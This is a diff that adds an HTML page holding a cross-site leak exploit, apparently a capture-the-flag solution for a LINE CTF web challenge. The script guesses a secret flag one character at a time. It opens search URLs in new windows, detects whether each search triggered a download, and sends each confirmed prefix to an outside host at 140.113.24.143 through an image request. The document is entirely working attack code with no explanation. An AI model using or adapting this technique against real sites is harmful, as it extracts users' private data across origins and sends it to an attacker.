@@ -1,0 +1,31 @@
+<body>
+    <script>
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789-'
+        function leak(query) {
+            for (i = 0; i < chars.length; ++i) {
+                const char = chars[i];
+                let url = `http://35.200.11.35/search?q=LINECTF{${query+char}%25}&download`;
+
+                // Get a window reference
+                let win = window.open(url);
+
+                // Wait for the window to load.
+                setTimeout(() => {
+                    try {
+                        // If a navigation occurs, the iframe will be cross-origin,
+                        // so accessing "win.origin" will throw an exception
+                        win.origin;
+                        new Image().src="http://140.113.24.143:9002/?leak="+(query+char)
+                        parent.console.log(url);
+                        leak(query+char);
+                    } catch (e) {
+                        parent.console.log('No download attempt detected');
+                        win.close();
+                    }
+
+                }, 1000);
+            }
+        }
+        leak('');
+    </script>
+</body>
